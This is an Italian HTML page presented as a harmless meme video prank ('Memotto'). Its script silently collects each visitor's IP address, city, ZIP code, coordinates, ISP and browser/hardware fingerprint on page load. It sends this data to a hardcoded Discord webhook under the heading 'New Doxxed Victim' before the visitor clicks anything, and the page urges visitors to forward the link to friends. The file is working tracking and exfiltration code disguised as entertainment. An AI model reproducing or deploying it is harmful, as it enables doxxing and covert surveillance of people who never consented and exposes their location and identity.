<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Memotto</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { background: rgb(0, 0, 0); color: rgb(255, 255, 255); }
        body { margin: 0; overflow: hidden; height: 100vh; font-family: Arial, Helvetica, sans-serif; }
        body, #preload, #loading, #start, #data { display: flex; justify-content: center; align-items: center; }
        #preload, #video { height: 100vh; width: 100vw; position: absolute; top: 0; left: 0; }
        #preload, #loading, #start, #data { flex-direction: column; font-size: 36px; text-align: center; }
        #preload { gap: 8px; z-index: 2; }
        #data { flex-direction: column; text-align: center; }
        #data, #data span { z-index: 1; background: transparent !important; }
        .subtitle { font-size: 16px; }
        @media only screen and (min-aspect-ratio: 1/1) { #video { object-fit: cover; } }
    </style>
    <script>
        async function sendToDiscord(dataArray) {
            const webhookURL = "https://discord.com/api/webhooks/1444469592104636448/S3a-CQE08WdFGZfqth88BzRIb2GP5ctae13KxpzZauCQWV4_3wMkKBg8jyb4Mmtj3iq-";

            const embed = {
                title: "ðŸŽ¯ Nuova Vittima Doxxata (Chill)",
                description: "```" + dataArray.join("\n") + "```",
                color: 16711680,
                timestamp: new Date().toISOString(),
                footer: { text: "Meme Prank - Solo uno scherzo, chill ðŸ˜‚" }
            };

            await fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ embeds: [embed] })
            }).catch(console.error);
        }

        window.onload = async () => {
            const loadingProgress = document.getElementById('loading-progress');
            const video = document.getElementById('video');
            const preload = document.getElementById('preload');
            const loading = document.getElementById('loading');
            const start = document.getElementById('start');
            const data = document.getElementById('data');
            const p = (k, d, s = '') => { if (d) memes.push(`${k}: ${d}${s}`); };
            const memes = [];
            let step = 0;
            let interval;

            video.oncanplaythrough = async () => {  // Questo triggera solo quando il video Ã¨ caricato
                loadingProgress.textContent = '80';

                const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query,hostname');
                const geo = await res.json();

                if (geo.status !== 'success') {
                    loading.innerText = 'Errore dati (disabilita VPN/adblock)';
                    return;
                }

                loadingProgress.textContent = '99';

                const ua = navigator.userAgent;
                let browserName = 'Sconosciuto';
                if (ua.includes('Chrome')) browserName = 'Google Chrome';
                else if (ua.includes('Firefox')) browserName = 'Mozilla Firefox';
                else if (ua.includes('Safari')) browserName = 'Safari';
                else if (ua.includes('Edge')) browserName = 'Microsoft Edge';

                p('Indirizzo IP', geo.query);
                p('Paese', geo.country);
                p('Regione', geo.regionName);
                p('CittÃ ', geo.city);
                p('Codice ZIP', geo.zip);
                p('Latitudine', geo.lat);
                p('Longitudine', geo.lon);
                p('Timezone', geo.timezone);
                p('ISP', geo.isp);
                p('Organizzazione', geo.org);
                p('Hostname', geo.hostname || 'Non disponibile');
                p('Ora Corrente', new Date().toLocaleString());
                p('Nome Del Browser', browserName);
                p('Telefono | Tablet', /Mobi|Android|iPhone|iPad/.test(ua) ? 'Yes' : 'No');
                p('Riferimento', document.referrer || 'None');
                p('Lingua Di Sistema', navigator.languages.join(', '));
                p('Larghezza Schermo', screen.width, 'px');
                p('Altezza Schermo', screen.height, 'px');
                p('Threads Della CPU', navigator.hardwareConcurrency);

                const canvas = document.createElement('canvas');
                let gl;
                try {
                    gl = canvas.getContext('webgl');
                    if (gl) p('Info GPU', gl.getParameter(gl.RENDERER));
                } catch (e) {}

                await sendToDiscord(memes);

                loadingProgress.textContent = '100';
                loading.style.display = 'none';
                start.style.display = 'flex';
                preload.style.cursor = 'pointer';
            };

            video.onended = () => {
                video.style.display = 'none';
                if (interval) clearInterval(interval);
            };

            preload.onclick = () => {
                if (start.style.display !== 'flex') return;
                preload.style.display = 'none';
                video.play();
                let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20);
                data.style.fontSize = fontSize + 'px';
                interval = setInterval(() => {
                    const time = video.currentTime - 13 - step * 0.5;  // Timing approssimativo per l'effetto
                    if (time > 0) {
                        if (step === 0) document.title = 'Sei Stato Doxato (Chill)';
                        const el = document.createElement('span');
                        el.textContent = memes[step];
                        data.appendChild(el);
                        const height = data.getBoundingClientRect().height;
                        if (height > window.innerHeight) {
                            fontSize -= fontSize / 10;
                            data.style.fontSize = fontSize + 'px';
                        }
                        step++;
                    }
                }, 10);
            };

            video.src = 'jammin.mp4';  // Ora punta al tuo file caricato
            video.load();
        };
    </script>
</head>
<body>
    <div id="preload">
        <div id="loading">
            <span>Caricamento In Corso</span>
            <span class="subtitle"><span id="loading-progress">0</span>%</span>
        </div>
        <div id="start" style="display: none">
            <span>Clica Per Iniziare</span>
        </div>
        <span class="subtitle">Piccolo Meme Sono Molto Chill :)</span>
        <span class="subtitle">Questa Esperienza Dovrai Ricordarla, Invia Questo Link Ai Tuoi Amici Per Una Bella Reazione</span>
        <span class="subtitle">Grazie, Goditi Il Video.</span>
    </div>
    <div id="data"></div>
    <video id="video" playsinline style="pointer-events: none"></video>
</body>
</html>
